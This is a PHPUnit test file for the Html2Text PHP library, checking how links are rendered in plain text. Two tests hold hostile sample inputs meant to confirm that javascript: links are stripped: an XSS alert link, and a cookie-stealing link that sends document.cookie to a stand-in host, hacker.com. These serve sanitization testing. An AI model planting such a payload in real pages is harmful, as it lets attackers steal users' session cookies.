<?php

namespace voku\Html2Text\tests;

use \voku\Html2Text\Html2Text;

/**
 * Class LinkTest
 *
 * @package Html2Text
 */
class LinkTest extends \PHPUnit_Framework_TestCase
{
  const TEST_HTML = '<a href="http://example.com">Link text</a>';

  public function testDoLinksAfter()
  {
    $expected = <<<EOT
Link text [1]

Links:
------
[1] http://example.com
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'table'));
    $output = $html2text->getText();

    self::assertEquals(str_replace(array("\n", "\r\n", "\r"), "\n", $expected), $output);
  }

  public function testDoLinksInline()
  {
    $expected = <<<EOT
Link text [http://example.com]
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'inline'));
    $output = $html2text->getText();

    self::assertEquals($expected, $output);
  }

  public function testDoLinksBBCode()
  {
    $expected = <<<EOT
[url=http://example.com]Link text[/url]
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'bbcode'));
    $output = $html2text->getText();

    self::assertEquals($output, $expected);
  }

  public function testDoLinksNone()
  {
    $expected = <<<EOT
Link text
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'none'));
    $output = $html2text->getText();

    self::assertEquals($output, $expected);
  }

  public function testDoLinksNextline()
  {
    $expected = <<<EOT
Link text
[http://example.com]
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'nextline'));
    $output = $html2text->getText();

    self::assertEquals(str_replace(array("\n", "\r\n", "\r"), "\n", $expected), $output);
  }

  public function testDoLinksInHtmlTable()
  {
    $html = <<<EOT
<p><a href="http://foo.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://lall.com" class="foo">Link text lall</a></p>
<p><a href="http://lall.com" class="bar">Link text lall</a></p>
<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://example.com" class="_html2text_link_none">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_inline">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_nextline">Link text</a></p>
EOT;

    $expected = <<<EOT
Link text lall [http://foo.com]

Link text lall [1]

Link text lall [1]

Link text lall [http://lall.com]

Link text lall [http://lall.com]

Link text

Link text [http://example.com]

Link text
[http://example.com]

Links:
------
[1] http://lall.com
EOT;

    $html2text = new Html2Text($html, array('do_links' => 'table'));
    $output = $html2text->getText();

    self::assertEquals(str_replace(array("\n", "\r\n", "\r"), "\n", $expected), $output);
  }

  public function testDoLinksInHtml()
  {
    $html = <<<EOT
<p><a href="http://foo.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://example.com" class="_html2text_link_none">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_inline">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_nextline">Link text</a></p>
EOT;

    $expected = <<<EOT
Link text lall [http://foo.com]

Link text lall [http://lall.com]

Link text lall [http://lall.com]

Link text

Link text [http://example.com]

Link text
[http://example.com]
EOT;

    $html2text = new Html2Text($html);
    $output = $html2text->getText();

    self::assertEquals(str_replace(array("\n", "\r\n", "\r"), "\n", $expected), $output);
  }

  public function testBaseUrl()
  {
    $html = '<a href="/relative">Link text</a>';
    $expected = 'Link text [http://example.com/relative]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));
    $html2text->setBaseUrl('http://example.com');

    self::assertEquals($expected, $html2text->getText());
  }

  public function testBaseUrlOld()
  {
    $html = '<a href="/relative">Link text</a>';
    $expected = 'Link text [http://example.com/relative]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));
    $html2text->set_base_url('http://example.com');

    self::assertEquals($expected, $html2text->getText());
  }

  public function testIgnoredLinkTypes()
  {
    $html = '
    <a href="javascript:alert(\'XSS\')">XSS</a>
    <br />
    <a href="mailto:foo.bar@example.org">Foo Bar Example, foo.bar@example.org</a>
    <br />
    <a href="#">Link text</a>
    <br />
    <a href="/">Link text</a>
    ';
    $expected = 'XSS
Foo Bar Example, foo.bar@example.org
Link text
Link text [/]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));

    self::assertEquals(str_replace(array("\n", "\r\n", "\r"), "\n", $expected), $html2text->getText());
  }

  public function testBaseUrlWithPlaceholder()
  {
    $html = '<a href="/relative">Link text</a>';
    $expected = 'Link text [%baseurl%/relative]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));
    $html2text->setBaseUrl('%baseurl%');

    self::assertEquals($expected, $html2text->getText());
  }

  public function testBoldLinks()
  {
    $html = '<b><a href="http://example.com">Link text</a></b>';
    $expected = 'LINK TEXT [http://example.com]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));

    self::assertEquals($expected, $html2text->getText());
  }

  public function testInvertedBoldLinks()
  {
    $html = '<a href="http://example.com"><b>Link text</b></a>';
    $expected = 'LINK TEXT [http://example.com]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));

    self::assertEquals($expected, $html2text->getText());
  }

  public function testJavascriptSanitizing()
  {
    $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
    $expected = 'Link text';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));

    self::assertEquals($expected, $html2text->getText());
  }
}
